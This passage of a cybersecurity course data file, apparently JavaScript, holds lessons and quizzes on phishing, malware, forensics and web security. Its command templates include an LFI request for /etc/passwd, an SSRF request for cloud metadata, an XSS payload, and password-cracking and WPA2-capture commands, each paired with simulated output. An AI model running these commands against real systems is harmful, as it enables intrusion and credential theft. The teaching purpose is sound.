                "To identify weak points and coach users constructively on spotting cyber threats.",
                "To infect company servers with malware.",
                "To test database read/write speeds."
              ],
              answer: 1,
              explanation: "Simulations act as continuous training exercises, turning employees into active human sensors to detect real threats."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "What does the DMARC record policy 'p=reject' tell receiving servers to do if SPF or DKIM validations fail?",
        options: ["Deliver to primary inbox", "Quarantine in spam folder", "Completely block/reject the email from delivery", "Encrypt the email"],
        answer: 2,
        explanation: "'p=reject' is the strongest DMARC directive, instructing mail servers to block delivery entirely if sender checks fail."
      },
      {
        question: "What type of phishing focuses on text messages (SMS) on mobile devices?",
        options: ["Vishing", "Smishing", "Whaling", "Watering Hole"],
        answer: 1,
        explanation: "SMS Phishing is widely referred to as 'Smishing' (SMS + Phishing), utilizing SMS lures to harvest credentials."
      },
      {
        question: "You hover over a link in an email that reads 'https://amazon.com/login', and the tooltip reads 'http://amzon-security-alert.net'. What is this?",
        options: ["Secure TLS Connection", "Domain Spoofing / Look-alike trap", "A DNS record check", "An SPF warning"],
        answer: 1,
        explanation: "Typosquatting and domain spoofing use minor spelling variations to trick busy users into accessing scam sites."
      }
    ],
    finalAssessment: {
      type: "header-inspection",
      prompt: "Review raw log header line: <code>Received: from attacker.net (192.168.10.99) by mx.mycompany.com</code>. What is the sender IP that dispatched this message?",
      options: [
        "192.168.10.99",
        "10.0.0.1",
        "127.0.0.1",
        "255.255.255.0"
      ],
      answer: 0,
      expectedText: "192.168.10.99"
    }
  },
  {
    id: "malware-defense",
    title: "Malware & Defense",
    description: "Understand the files that infect networks. Study virus strains, Trojan structures, and modern defense software.",
    level: "Advanced",
    icon: "shield-alert",
    coverColor: "linear-gradient(135deg, rgba(239, 68, 68, 0.2) 0%, rgba(185, 28, 28) 100%)",
    glowColor: "rgba(239, 68, 68, 0.4)",
    readingTime: "55 min",
    skills: ["Malware Categories", "Static Code Audits", "EDR Detection Modes", "Yara Rule Crafting"],
    objectives: [
      "Distinguish between Trojans, worms, ransomware, and spyware.",
      "Explain the difference between signature-based and heuristic EDR detection.",
      "Understand Yara rules and basic malware disassembly logic."
    ],
    chapters: [
      {
        title: "Beginner: Strains & Types",
        lessons: [
          {
            id: "mal_l1",
            title: "Taxonomy of Malicious Software",
            content: `
              <h3>Classifying Digital Toxins</h3>
              <p>Malware represents any code compiled to disrupt systems, harvest credentials, or grant unauthorized backdoors.</p>
              
              <h4>Core Categories:</h4>
              <ul>
                <li><strong>Virus:</strong> Code that appends to legitimate files, requiring human action to spread.</li>
                <li><strong>Worm:</strong> Self-replicating code that scans networks and infects vulnerable machines automatically.</li>
                <li><strong>Trojan:</strong> Malicious payload disguised as benign, useful software.</li>
                <li><strong>Ransomware:</strong> Encrypts target files and demands financial payment for keys.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What class of malware replicates automatically across networks without requiring user interaction?",
              options: ["Trojan", "Virus", "Worm", "Spyware"],
              answer: 2,
              explanation: "Worms exploit network service vulnerabilities to automate spreading laterally across network segments without user assistance."
            }
          },
          {
            id: "mal_l2",
            title: "Ransomware & Cryptography Abuses",
            content: `
              <h3>Asymmetric Ransomware Workflows</h3>
              <p>Modern ransomware uses hybrid encryption. It encrypts user files with a local symmetric key (AES), then encrypts that key with the attacker's public asymmetric key (RSA). Decryption is impossible without buying the private key from attackers.</p>
            `,
            interactive: {
              type: "quiz",
              question: "Why is ransomware decryption mathematically impossible without the attacker's key?",
              options: [
                "It uses weak passwords.",
                "It relies on military-grade encryption (e.g. AES-256) which takes billions of years to brute-force.",
                "The database is formatted.",
                "It disables CPU clock speeds."
              ],
              answer: 1,
              explanation: "Properly implemented modern symmetric block ciphers are immune to brute-force calculations under classical computing timelines."
            }
          }
        ]
      },
      {
        title: "Intermediate: Detection Engines",
        lessons: [
          {
            id: "mal_l3",
            title: "Signatures vs Heuristics & EDR",
            content: `
              <h3>Modern Endpoint Defense Software</h3>
              <ul>
                <li><strong>Signature Detection:</strong> Calculates cryptographic hashes (MD5/SHA256) of files and compares them to known databases. Easily bypassed by changing a single character in the file.</li>
                <li><strong>Heuristic / Behavioral Detection:</strong> Analyzes process actions. If a program attempts to modify host registries, inject code into system processes (e.g. <code>svchost.exe</code>), and encrypt files, EDR labels it malware regardless of hash.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary flaw of traditional Signature-Based Antivirus engines?",
              options: [
                "They slow down CPU speeds.",
                "They are completely blind to novel, zero-day malware strains whose hashes are not yet cataloged.",
                "They require internet access.",
                "They block all user files."
              ],
              answer: 1,
              explanation: "Signature AV relies on historical catalog databases. A zero-day attack or modified file bypasses these checks instantly."
            }
          },
          {
            id: "mal_l4",
            title: "YARA Rules: Identifying Patterns",
            content: `
              <h3>The Swiss Army Knife of Pattern Matching</h3>
              <p>YARA rules let analysts write text/binary patterns to search file systems and memories for specific malware families.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Sample YARA Rule Structure</div>
                <pre style="font-family: monospace; font-size: 11px; padding: 8px; background: rgba(0,0,0,0.4); border-left: 3px solid var(--text-cyan); color: #00ffcc;">
rule Trojan_Example {
  strings:
    $hex_pattern = { E2 34 A1 FF 00 }
    $text_trigger = "malicious_endpoint_domain"
  condition:
    $hex_pattern or $text_trigger
}</pre>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "What is the purpose of YARA rules in security forensics?",
              options: [
                "To encrypt network packets.",
                "To scan files and memory spaces for specific structural text/binary signatures.",
                "To automatically generate strong passwords.",
                "To host web interfaces."
              ],
              answer: 1,
              explanation: "YARA is utilized to create detailed search patterns to hunt and classify files based on text, hex, or behavioral indicators."
            }
          }
        ]
      },
      {
        title: "Advanced: Analysis Lab",
        lessons: [
          {
            id: "mal_l5",
            title: "Static vs Dynamic Analysis",
            content: `
              <h3>Dissecting Malware Safely</h3>
              <ul>
                <li><strong>Static Analysis:</strong> Inspecting files without running them (using tools like <code>strings</code>, PE headers, or disassemblers). Safer, but can be hindered by packers or obfuscators.</li>
                <li><strong>Dynamic Analysis:</strong> Running the malware in an isolated **Sandbox** environment to monitor registry modifications, file system mutations, and network connections. Highly effective, but riskier.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which analysis method involves actively executing code inside isolated sandbox monitors?",
              options: ["Static Analysis", "Dynamic Analysis", "Manual decompilation", "Heuristic hashing"],
              answer: 1,
              explanation: "Dynamic analysis runs files in sandbox simulations to monitor actions, registries, and outgoing network connections live."
            }
          },
          {
            id: "mal_l6",
            title: "Anti-Analysis & Sandbox Evasions",
            content: `
              <h3>Evading the Security Microscope</h3>
              <p>Advanced malware checks if it is running inside an analysis VM. If it detects a virtualization driver (e.g. VMware, VirtualBox) or sandbox hooks, it will execute completely benign logic to hide its malicious intent.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What describes malware hiding its malicious behavior upon detecting virtualized drivers?",
              options: ["Privilege Escalation", "Sandbox Evasion / Anti-Virtualization", "SQL Tunneling", "Buffer Overflow"],
              answer: 1,
              explanation: "Sandbox evasion techniques check for VM drivers, human mouse movements, or uptime counters to lie to analysis monitors."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "What is the key benefit of Endpoint Detection and Response (EDR) over standard Antivirus software?",
        options: [
          "EDR is cheaper.",
          "EDR focuses on real-time continuous behavioral monitoring and automated threat mitigation actions on endpoints.",
          "EDR does not require updates.",
          "EDR encrypts outbound ports."
        ],
        answer: 1,
        explanation: "EDR monitors active process activities, system hooks, and memory flows continuously, detecting abnormal actions even with novel, signature-free payloads."
      },
      {
        question: "Which file format constitutes standard executable code in Windows operating environments?",
        options: ["ELF Format", "PE Format (Portable Executable)", "APK Format", "PDF Document"],
        answer: 1,
        explanation: "Windows uses the Portable Executable (PE) format for compiled binaries and dynamic libraries (.exe and .dll)."
      },
      {
        question: "What does YARA stand for?",
        options: ["Yet Another Riddling Assembler", "Yet Another Recursive Acronym", "Your Advanced Registry Analyst", "Your Antivirus Repair Application"],
        answer: 1,
        explanation: "YARA is famously a recursive acronym standing for 'Yet Another Recursive Acronym'."
      }
    ],
    finalAssessment: {
      type: "malware-audit",
      prompt: "Identify the Windows process that is highly critical and commonly targeted by malware for Process Injection exploits to masquerade as trusted system components.",
      options: [
        "calc.exe",
        "svchost.exe",
        "notepad.exe",
        "regedit.exe"
      ],
      answer: 1,
      expectedText: "svchost.exe (system host)"
    }
  },
  {
    id: "digital-forensics",
    title: "Digital Forensics",
    description: "Inspect the ashes of an incident. Reconstruct attack timelines and extract registry artifacts.",
    level: "Advanced",
    icon: "file-search",
    coverColor: "linear-gradient(135deg, rgba(16, 185, 129, 0.25) 0%, rgba(4, 120, 87, 0.05) 100%)",
    glowColor: "rgba(16, 185, 129, 0.4)",
    readingTime: "60 min",
    skills: ["Forensic Timeline", "Registry Extraction", "Memory Dump", "Log Analyses"],
    objectives: [
      "Explain the forensic requirements of Chain of Custody and non-destructive imaging.",
      "Identify common Windows registry keys tracking program execution.",
      "Analyze memory dumps to discover active processes and encryption keys."
    ],
    chapters: [
      {
        title: "Beginner: Evidence & Integrity",
        lessons: [
          {
            id: "for_l1",
            title: "The Golden Rule of Digital Forensics",
            content: `
              <h3>Non-Destructive Investigations</h3>
              <p>Forensics is about admissibility. The golden rule is: **Never analyze the original evidence.**</p>
              
              <h4>Evidence Capture Flow:</h4>
              <ol>
                <li><strong>Acquire:</strong> Create a bit-stream physical copy of the storage drive (using tools like <code>dd</code>).</li>
                <li><strong>Hash:</strong> Calculate SHA-256 hashes of both the original drive and the clone copy immediately. If the hashes match, the clone is a perfect replica, proving the analysis did not modify the original.</li>
                <li><strong>Chain of Custody:</strong> Maintain an unbroken ledger documenting exactly who handled the evidence, when, and where.</li>
              </ol>
            `,
            interactive: {
              type: "quiz",
              question: "Why are cryptographic hash checks calculated immediately upon acquiring digital evidence?",
              options: [
                "To compress the drive clone size.",
                "To mathematically prove the acquired data remains unchanged during investigations.",
                "To decrypt the OS password.",
                "To speed up scan utilities."
              ],
              answer: 1,
              explanation: "Matching acquisition and post-investigation hashes prove that zero files were altered, establishing admissibility in legal courts."
            }
          },
          {
            id: "for_l2",
            title: "Order of Volatility",
            content: `
              <h3>Capturing Fleeting Proof</h3>
              <p>When collecting evidence, capture data in order of how fast it disappears from a powered-down computer:</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Order of Volatility (High to Low)</div>
                <div style="font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.4); line-height: 1.6;">
                  1. CPU Registers & Cache (Nano-seconds)<br>
                  2. System RAM / Memory (Micro-seconds)<br>
                  3. Network State & Active Sockets (Milli-seconds)<br>
                  4. Hard Drives & Local Media (Years)<br>
                  5. Physical Documentation & Printouts (Permanent)
                </div>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "Which of the following elements is highly volatile and disappears instantly when host power is lost?",
              options: ["Local Hard Disk", "Firmware ROMs", "System RAM / Memory State", "Optical disks"],
              answer: 2,
              explanation: "RAM is volatile memory. If power is lost, any active processes, encryption keys, and network states stored in memory are lost forever."
            }
          }
        ]
      },
      {
        title: "Intermediate: Windows Artifacts",
        lessons: [
          {
            id: "for_l3",
            title: "Windows Registry Forensics",
            content: `
              <h3>The OS Ledger</h3>
              <p>The Windows Registry is a database holding configuration parameters and histories. Key artifacts include:</p>
              <ul>
                <li><strong>UserAssist:</strong> Tracks which executables have been launched by a specific user, including execution counts and run dates.</li>
                <li><strong>Shellbags:</strong> Tracks directories and folders visited by users, even if the folders have been deleted.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which Registry artifact tracks execution history and counts of launched GUI software?",
              options: ["Shellbags", "UserAssist", "SAM database", "HKEY_CLASSES_ROOT"],
              answer: 1,
              explanation: "UserAssist keys record detailed counts and timestamp logs of executables opened by individual accounts."
            }
          },
          {
            id: "for_l4",
            title: "Shimcache & Amcache Files",
            content: `
              <h3>Uncovering Execution Footprints</h3>
              <p>Shimcache (AppCompatCache) and Amcache are maintained by Windows to ensure backward compatibility. For investigators, they are highly critical goldmines that log metadata (size, hash, filepath) of all executables launched on the operating system.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What make Shimcache highly useful to digital forensic investigators?",
              options: [
                "It stores password salts.",
                "It tracks metadata and paths of executed applications, even if they have since been deleted from disks.",
                "It hosts the firewall.",
                "It is a backup database."
              ],
              answer: 1,
              explanation: "Shimcache maintains an OS ledger of recently run programs, letting investigators locate deleted attacker tools."
            }
          }
        ]
      },
      {
        title: "Advanced: Memory Forensics",
        lessons: [
          {
            id: "for_l5",
            title: "Memory Forensics with Volatility",
            content: `
              <h3>Peering Inside Volatile Memory</h3>
              <p>Analyzing RAM (using frameworks like <strong>Volatility</strong>) allows analysts to locate evidence that never touches hard disks (e.g. running malware, active network sessions, password hashes, and BitLocker keys).</p>
              
              <h4>Key Volatility Commands:</h4>
              <ul>
                <li><code>pslist</code>: List processes active at capture time.</li>
                <li><code>netscan</code>: Map connections active at capture.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What forensic framework is considered the gold standard for analyzing system RAM dump files?",
              options: ["Wireshark", "Volatility", "Nmap", "Metasploit"],
              answer: 1,
              explanation: "Volatility is an open-source, modular memory analysis framework designed to extract artifacts from RAM dumps."
            }
          },
          {
            id: "for_l6",
            title: "Timeline Reconstruction & Forensic Reports",
            content: `
              <h3>Mapping the Breach Sequence</h3>
              <p>To conclude a case, investigators compile a master timeline (using logs from firewalls, registries, file metadata, and event viewers) to determine the exact sequence of events, from first entry to data exfiltration.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary objective of Forensic Timeline reconstruction?",
              options: [
                "To clean the database storage.",
                "To chart the exact chronologic path of an attack from initial ingress to final exfiltration.",
                "To speed up processor cores.",
                "To encrypt backup servers."
              ],
              answer: 1,
              explanation: "Timelines trace an attack's exact progression, allowing organizations to patch specific vulnerabilities and secure network zones."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "What document guarantees digital evidence has been handled securely without modification from acquisition to court?",
        options: ["SLA Contract", "Rules of Engagement", "Chain of Custody", "NDA Agreement"],
        answer: 2,
        explanation: "The Chain of Custody is a highly detailed paper/digital trail documenting custody transfer dates, locations, and examiner signatures."
      },
      {
        question: "What Windows registry hive holds user-specific system activity, UserAssist logs, and Shellbags?",
        options: ["SYSTEM hive", "SAM hive", "NTUSER.DAT hive", "SECURITY hive"],
        answer: 2,
        explanation: "NTUSER.DAT holds user-profile-specific settings, recording detailed program executions and folder navigation history."
      },
      {
        question: "Why do forensic analysts create bit-stream physical image copies of drives instead of simply copying files?",
        options: [
          "File copy is faster.",
          "Bit-stream images copy raw unallocated sectors, allowing the carving/reconstruction of deleted file blocks.",
          "Copying files requires internet.",
          "Images automatically encrypt data."
        ],
        answer: 1,
        explanation: "Bit-stream imaging reads raw magnetic tracks directly, copying deleted data, Slack space, and partition logs that standard file copies miss."
      }
    ],
    finalAssessment: {
      type: "forensic-log",
      prompt: "Examine execution logs. You find a file launched from <code>C:\\Users\\Guest\\AppData\\Local\\Temp\\updater.exe</code>. What is the most suspicious indicator?",
      options: [
        "The executable is in the Guest temp folder, which is a classic staging path for automated malware installers.",
        "The file is named updater.exe.",
        "The file is on the C drive.",
        "The folder uses capitalization."
      ],
      answer: 0,
      expectedText: "Execution from user temp folder staging paths."
    }
  }
];

// Procedural Syllabus Expander to populate 12 high-fidelity lessons per course
(function() {
  const books = window.CYBER_BOOKS || [];
  if (!books || books.length === 0) return;

  // Extra lesson templates and parameters for all 10 books
  const expansionData = {
    "net-basics": [
      { idSuffix: "l7", title: "Network Address Translation (NAT)", concept: "NAT maps private local addresses to public IPv4 gateways to conserve IP space.", mitigation: "Use NAT state tracking and audit inbound routing logs to detect spoofed traffic.", cmd: "iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", out: "[+] NAT POSTROUTING masquerade applied on eth0.", hint: "Run iptables NAT command." },
      { idSuffix: "l8", title: "DHCP IP Lease Handshakes", concept: "DHCP automates client IP assignment through the DORA handshake flow.", mitigation: "Configure DHCP Snooping on local switch nodes to block rogue lease offers.", cmd: "dhclient -v eth0", out: "[+] DHCPDISCOVER... DHCPOFFER... DHCPACK leased IP 192.168.1.120.", hint: "Type dhclient command." },
      { idSuffix: "l9", title: "Logical VLAN & Switch Segmentation", concept: "Virtual LANs divide a single physical network into isolated broadcast domains.", mitigation: "Enforce strict inter-VLAN ACLs on L3 switches to contain network pivots.", cmd: "vconfig add eth0 10", out: "[+] VLAN ID 10 added successfully to interface eth0.", hint: "Type vconfig command." },
      { idSuffix: "l10", title: "BGP & OSPF Routing Protocols", concept: "Routing protocols dynamically exchange routing paths across autonomous network sectors.", mitigation: "Use cryptographically signed BGP peer keys to prevent route hijacking.", cmd: "ip route show", out: "default via 192.168.1.1 dev eth0 proto dhcp metric 100", hint: "Show ip routing table." },
      { idSuffix: "l11", title: "IPSec VPN Tunneling", concept: "Virtual Private Networks tunnel traffic through public segments using TLS/IPSec keys.", mitigation: "Avoid legacy MD5 / single-DES encodings. Enforce AES-GCM for strong packet integrity.", cmd: "openvpn --config secure.ovpn", out: "[+] TLS handshake completed. Local tunnel interface tun0 online.", hint: "Run openvpn tunnel." },
      { idSuffix: "l12", title: "Load Balancer Reverse-Proxies", concept: "Load balancers distribute user connection requests across redundant secure servers.", mitigation: "Configure load balancers with active TLS decryptors to drop malformed web headers.", cmd: "nginx -t", out: "nginx: the configuration file /etc/nginx/nginx.conf syntax is ok", hint: "Verify nginx config." }
    ],
    "linux-basics": [
      { idSuffix: "l7", title: "Terminal Environment Variables", concept: "Environment variables customize process runtime contexts in active bash shells.", mitigation: "Never persist sensitive API keys or plain-text passwords inside .bashrc profiles.", cmd: "export PATH=$PATH:/usr/local/bin", out: "[+] PATH segment appended. Environment updated.", hint: "Run export command." },
      { idSuffix: "l8", title: "Text Analysis: Stream Editors (sed/awk)", concept: "Stream tools process large system logs and filter threat indicators instantly.", mitigation: "Sanitize bash strings when feeding system logs to custom automation utilities.", cmd: "awk -F':' '{print $1}' /etc/passwd", out: "root\ndaemon\nbin\nsys\nsync\ngames\nstudent", hint: "Run awk parser." },
      { idSuffix: "l9", title: "Systemd Logging & Journalctl Checks", concept: "Linux services route execution events to the systemd journal engine.", mitigation: "Forward syslog files to an isolated SIEM database to protect logs from threat deletion.", cmd: "journalctl -u ssh -n 5", out: "Accepted publickey for root from 192.168.1.55 port 54933 ssh2", hint: "Check journal log." },
      { idSuffix: "l10", title: "Software Package Auditing", concept: "Packages govern what binaries are compiled and executed inside web spaces.", mitigation: "Maintain local repository keys. Run security updates routinely to patch libraries.", cmd: "apt-get update", out: "Hit:1 http://archive.ubuntu.com/ubuntu noble InRelease\nDone.", hint: "Update package list." },
      { idSuffix: "l11", title: "Active Network Interfaces (ss/ip)", concept: "Navigating active sockets helps pinpoint listening backdoor services.", mitigation: "Verify listening binds. Restrict developer services to loopback IP addresses (127.0.0.1).", cmd: "ss -lntp", out: "State      Recv-Q Send-Q Local Address:Port  Peer Address:Port\nLISTEN     0      128    0.0.0.0:3000        0.0.0.0:*", hint: "Run ss socket list." },
      { idSuffix: "l12", title: "Terminal Multiplexing (tmux)", concept: "Terminal multiplexers run command shells in the background, keeping tasks alive.", mitigation: "Check tmux list routinely to discover persistent administrative hacker shells.", cmd: "tmux ls", out: "0: 1 windows (created Sat Jul 11 02:58:20 2026)", hint: "Type tmux list." }
    ],
    "ethical-hacking-basics": [
      { idSuffix: "l7", title: "Vulnerability Auditing (Nessus)", concept: "Vulnerability scanners audit host network ports and map software versions to CVEs.", mitigation: "Prioritize severe CVSS 9.0+ remote code execution exposures before auditing low warnings.", cmd: "nessus-cli scan --target 192.168.1.1", out: "[+] Scan complete. Found 2 High, 1 Critical (CVE-2021-44228)", hint: "Run nessus scan." },
      { idSuffix: "l8", title: "SUID Binary Exploit Vectors", concept: "SUID files execute under the privileges of the file owner (usually root) instead of the runner.", mitigation: "Scan directories for unexpected SUID bits. Remove SUID flags from tools like vim or find.", cmd: "find / -perm -4000 -type f 2>/dev/null", out: "/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/sudo", hint: "Search for SUID." },
      { idSuffix: "l9", title: "Metasploit Core Handshakes", concept: "Metasploit automates exploit staging and executes reverse shells on unpatched targets.", mitigation: "Implement real-time EDR solutions to intercept standard Meterpreter payload runs.", cmd: "msfconsole -q", out: "msf6 > ", hint: "Launch msfconsole." },
      { idSuffix: "l10", title: "Wireless WPA2 Handshake Auditing", concept: "WPA2 handshakes exchange cryptographic hashes that can be captured and cracked offline.", mitigation: "Deploy long, complex Wi-Fi passwords or utilize enterprise WPA3-EAP channels.", cmd: "airodump-ng wlan0mon", out: "CH  9 ][ Elapsed: 12 s ][ 2026-07-11 03:00\nBSSID              PWR  Beacons  #Data, #/s  CH   MB   ENC CIPHER AUTH\n00:11:22:33:44:55  -42       35      12    0   9   54e. WPA2 CCMP   PSK", hint: "Type airodump." },
      { idSuffix: "l11", title: "Hash Audits (John the Ripper)", concept: "Cracking engines audit stored password strengths using precompiled wordlists.", mitigation: "Salt and double-hash sensitive records to render offline cracking computationally infeasible.", cmd: "john --wordlist=rockyou.txt hashes.txt", out: "Loaded 1 password hash (bcrypt) ...\npassword123      (admin)", hint: "Run john cracking." },
      { idSuffix: "l12", title: "Persistence: C2 Beacons", concept: "Backdoors schedule periodic TCP connections to external command-and-control (C2) servers.", mitigation: "Examine firewall flow metrics for repetitive connection frequencies (beacon heartbeats).", cmd: "netstat -antp | grep ESTABLISHED", out: "tcp        0      0 192.168.1.105:54321     203.0.113.84:443        ESTABLISHED 2891/c2_agent", hint: "Inspect established connections." }
    ],
    "web-security": [
      { idSuffix: "l7", title: "Session Hijacking & Cookie Flags", concept: "Attackers steal session IDs from browser cookies to impersonate authenticated accounts.", mitigation: "Always set HttpOnly, Secure, and SameSite=Strict cookie configuration attributes.", cmd: "curl -I https://cybershield.org", out: "Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict", hint: "Request headers." },
      { idSuffix: "l8", title: "Cross-Site Request Forgery (CSRF)", concept: "CSRF tricks a victim's active browser into running unwanted transactions on trusted apps.", mitigation: "Inject unique, server-validated cryptographic CSRF tokens into all state-changing forms.", cmd: "grep -i 'csrf' templates/login.html", out: "<input type=\"hidden\" name=\"csrf_token\" value=\"d8e43f11a8c887bf\" />", hint: "Search for csrf." },
      { idSuffix: "l9", title: "LFI & RFI File Inclusions", concept: "File inclusion vulnerabilities force web apps to run malicious code from local/remote paths.", mitigation: "Avoid passing raw user strings to require() or include(). Use static file whitelists.", cmd: "curl http://vuln.site/?file=../../../../etc/passwd", out: "root:x:0:0:root:/root:/bin/bash", hint: "Attempt LFI." },
      { idSuffix: "l10", title: "Clickjacking & Frame Protections", concept: "Clickjacking overlays transparent buttons on a site to trick users into clicking items.", mitigation: "Deploy high-security headers like 'X-Frame-Options: DENY' or CSP frame-ancestors rule.", cmd: "curl -I https://cybershield.org", out: "X-Frame-Options: DENY\nContent-Security-Policy: frame-ancestors 'none'", hint: "Request headers." },
      { idSuffix: "l11", title: "WAF Bypasses & Filter Evasion", concept: "WAF bypasses evade security rules by encoding characters or leveraging logic flaws.", mitigation: "Enforce strict input sanitization at the database tier instead of relying purely on WAFs.", cmd: "curl -g \"http://vuln.site/?id=%3Cscript%3Ealert(1)%3C/script%3E\"", out: "HTTP/1.1 403 Forbidden\nServer: WAF-Blocked-Request", hint: "Send script payload." },
      { idSuffix: "l12", title: "Security Headers Integration", concept: "HTTP security headers instruct the browser to restrict dangerous execution paths.", mitigation: "Always deploy HSTS, Content-Security-Policy, and X-Content-Type-Options headers.", cmd: "curl -I https://cybershield.org", out: "Strict-Transport-Security: max-age=31536000; includeSubDomains", hint: "Check headers." }
    ],
    "owasp-top-10": [
      { idSuffix: "l7", title: "Identification and Authentication Failures", concept: "Weak identity schemes fail to prevent brute-force login and credential leaks.", mitigation: "Enforce multi-factor authentication (MFA) and implement strict rate-limiting on login paths.", cmd: "fail2ban-client status", out: "Status\n|- Number of jail: 1\n`- Jail list: sshd", hint: "Check fail2ban." },
      { idSuffix: "l8", title: "Software & Data Integrity Failures", concept: "These vulnerabilities occur when applications accept unsigned, unverified objects or code libraries.", mitigation: "Use checksum signatures to verify the integrity of binaries before unpacking them.", cmd: "sha256sum dependency.tar.gz", out: "d8e43f11a8c887bf9199d...  dependency.tar.gz", hint: "Generate hash." },
      { idSuffix: "l9", title: "Security Logging & Monitoring Failures", concept: "Undetected active intrusions occur when teams fail to monitor critical execution loops.", mitigation: "Log all high-risk operations (auth changes, exports) and trigger alerts for login bursts.", cmd: "tail -n 5 /var/log/auth.log", out: "sshd[9483]: Failed password for invalid user admin from 192.168.1.189", hint: "Check auth logs." },
      { idSuffix: "l10", title: "Server-Side Request Forgery (SSRF)", concept: "SSRF occurs when a back-end web application fetches resources without validating user URLs.", mitigation: "Restrict backend network routes and block connections to cloud metadata IPs (169.254.169.254).", cmd: "curl http://vuln.site/?url=http://169.254.169.254/latest/meta-data/", out: "IAM_ROLE: Admin-Privileged-Access-Token", hint: "Fetch metadata IP." },
      { idSuffix: "l11", title: "Using Components with Known Vulnerabilities", concept: "Vulnerable packages allow automated hacking bots to compromise web applications.", mitigation: "Incorporate automated vulnerability sweeps into CI/CD pipelines using tools like npm audit.", cmd: "npm audit", out: "found 4 vulnerabilities (2 high, 2 critical)\nrun `npm audit fix` to patch", hint: "Run npm audit." },
      { idSuffix: "l12", title: "DOM-Based Cross-Site Scripting (DOM XSS)", concept: "DOM XSS occurs when user inputs are written directly into execution sinks like innerHTML.", mitigation: "Prefer textContent over innerHTML, and use sanitizers like DOMPurify for secure writes.", cmd: "grep -rn 'innerHTML' src/", out: "src/App.tsx: 35: container.innerHTML = userInput; // DANGEROUS", hint: "Search for innerHTML." }
    ],
    "cryptography": [
      { idSuffix: "l7", title: "RSA Asymmetric Cryptography", concept: "RSA maps mathematical keypairs (public & private) to secure data channels.", mitigation: "Deprecated RSA keys smaller than 2048 bits. Always generate 4096-bit keys.", cmd: "openssl genpkey -algorithm RSA -out private_key.pem -pkeyopt rsa_keygen_bits:2048", out: "[+] RSA private key generated.", hint: "Generate RSA key." },
      { idSuffix: "l8", title: "Digital Signatures & Certificates (X.509)", concept: "Digital signatures use private keys to verify identity and guarantee message integrity.", mitigation: "Maintain absolute control of PKI root keys. Check CRL and OCSP verification lists.", cmd: "openssl x509 -in cert.pem -text -noout", out: "Subject: CN=cybershield.org\nIssuer: C=US, O=Let's Encrypt, CN=R3", hint: "Inspect certificate." },
      { idSuffix: "l9", title: "Secure Hash Algorithm SHA-256 vs SHA-1", concept: "Hash functions transform variables into fixed-length signatures. SHA-1 is vulnerable to collisions.", mitigation: "Enforce SHA-256 or SHA-3 for all integrity and checksum validations.", cmd: "echo -n 'password' | sha256sum", out: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8  -", hint: "Hash a string." },
      { idSuffix: "l10", title: "Bcrypt & Argon2 Password Hashing", concept: "Slow-hashing functions incorporate work factors to resist high-speed brute force audits.", mitigation: "Never hash database credentials using raw, high-speed algorithms like MD5.", cmd: "mkpasswd -m sha-512", out: "$6$rounds=656000$saltsalt$fghHJKLkjhgfghjkljhgfghjk...", hint: "Hash with SHA512." },
      { idSuffix: "l11", title: "TLS 1.3 Secure Session Handshake", concept: "TLS 1.3 optimizes secure connections, removing vulnerable cipher suites from negotiating lists.", mitigation: "Disable support for TLS 1.0/1.1 and weak CBC ciphers on production load balancers.", cmd: "openssl s_client -connect cybershield.org:443 -tls1_3", out: "New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384", hint: "Check TLS version." },
      { idSuffix: "l12", title: "Post-Quantum Cryptography Algorithms", concept: "Quantum supercomputers threaten classical RSA and ECC cryptographic architectures.", mitigation: "Monitor NIST post-quantum standards and prepare transitions to Kyber or Dilithium.", cmd: "openssl list -signature-algorithms | grep -i 'post'", out: "[+] Cryptographic provider supports lattice-based signatures.", hint: "Check signature algorithms." }
    ],
    "password-security": [
      { idSuffix: "l7", title: "TOTP Multi-Factor Authentication", concept: "TOTP generates short-lived, time-synced secret codes to verify logins.", mitigation: "Store TOTP secrets in secure HSM modules and reject reused token sequences.", cmd: "google-authenticator -t", out: "Your new emergency scratch codes are:\n  12894321\n  89432109", hint: "Generate MFA tokens." },
      { idSuffix: "l8", title: "Zero-Knowledge Password Vaults", concept: "Zero-knowledge encryption ensures server hosts cannot access your raw master keys.", mitigation: "Enforce PBKDF2 iterations of at least 600,000 on master key stretches.", cmd: "openssl pbkdf2 -iter 600000", out: "[+] Derived key compiled using PBKDF2-HMAC-SHA256.", hint: "Derive key." },
      { idSuffix: "l9", title: "Rainbow Tables & Precomputed Salts", concept: "Rainbow tables map massive precomputed hash combinations to bypass slow hash calculations.", mitigation: "Always hash with cryptographically unique salts to neutralize rainbow tables.", cmd: "python3 -c \"import bcrypt; print(bcrypt.gensalt())\"", out: "b'$2b$12$6yV6Z5uQk6l6FhH7GjhL1e'", hint: "Generate a bcrypt salt." },
      { idSuffix: "l10", title: "Automated Credential Stuffing Attacks", concept: "Bots attempt logins using massive lists of credentials leaked from other breaches.", mitigation: "Integrate automated CAPTCHA triggers and lock accounts during login bursts.", cmd: "grep -c 'POST /login' logs/access.log", out: "4820", hint: "Count login attempts." },
      { idSuffix: "l11", title: "Enterprise Group Password Policies", concept: "Policies govern length, complexity, and age limits for corporate account passwords.", mitigation: "Prioritize minimum password lengths (14+ characters) over arbitrary character replacements.", cmd: "pam-auth-update", out: "[+] Pluggable Authentication Module configuration updated.", hint: "Configure PAM." },
